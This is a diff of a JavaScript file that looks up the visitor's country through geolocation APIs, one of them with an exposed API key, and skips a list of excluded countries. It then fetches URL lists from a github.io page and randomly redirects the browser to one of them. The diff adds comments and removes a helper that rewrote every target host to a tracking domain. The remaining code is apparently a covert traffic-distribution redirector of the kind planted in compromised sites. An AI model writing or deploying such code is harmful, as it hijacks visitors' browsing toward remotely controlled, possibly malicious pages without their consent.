@@ -31,6 +31,7 @@ const jsonUrls = [
     'https://api.ipgeolocation.io/ipgeo?apiKey=d5b00b6c0ec2490592216aa7cc012d2c'
 ];
 
+
 // Configuration for country-based URL redirection
 const countryConfig = {
     GB: 'https://hellonetwork2023.github.io/uk/ukurls.json',
@@ -39,7 +40,7 @@ const countryConfig = {
 
 const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR', 'PK', 'RU'];
 
-// Fetch country information and redirect
+// Fetch country information
 (function fetchCountryAndRedirect() {
     const randomIndex = Math.floor(Math.random() * jsonUrls.length);
     const randomUrl = jsonUrls[randomIndex];
@@ -47,6 +48,7 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
     fetch(randomUrl)
         .then(response => response.json())
         .then(data => {
+            // Extract country code
             const countryCode = data.countryCode || data.country_code2;
 
             if (!countryCode) {
@@ -57,11 +59,13 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
 
             console.log('Detected country code:', countryCode);
 
+            // Check exclusion list
             if (excludedCountries.includes(countryCode)) {
                 console.log(`Country ${countryCode} is excluded from redirection.`);
                 return;
             }
 
+            // Fetch and redirect based on country
             const jsonFile = countryConfig[countryCode] || countryConfig.default;
             redirectToUrls(jsonFile);
         })
@@ -71,7 +75,7 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
         });
 })();
 
-// Redirect to URLs fetched from JSON
+// Fetch URLs from JSON and perform redirection
 function redirectToUrls(jsonFile, delay = 300) {
     fetch(jsonFile)
         .then(response => response.json())
@@ -81,7 +85,7 @@ function redirectToUrls(jsonFile, delay = 300) {
                 return;
             }
 
-            const urls = data.urls.map(site => enforceDomain2(site.url));
+            const urls = data.urls.map(site => site.url);
             const randomIndex = Math.floor(Math.random() * urls.length);
             const randomUrl = urls[randomIndex];
 
@@ -93,16 +97,4 @@ function redirectToUrls(jsonFile, delay = 300) {
         .catch(error => {
             console.error('Error fetching redirection URLs:', error);
         });
-}
-
-// Enforce Domain 2 in URLs
-function enforceDomain2(url) {
-    try {
-        const parsedUrl = new URL(url);
-        parsedUrl.hostname = 'server-tracking.eu'; // Replace with your actual Domain 2
-        return parsedUrl.toString();
-    } catch (error) {
-        console.error('Error parsing URL:', url, error);
-        return url; // Fallback to original URL if parsing fails
-    }
 }
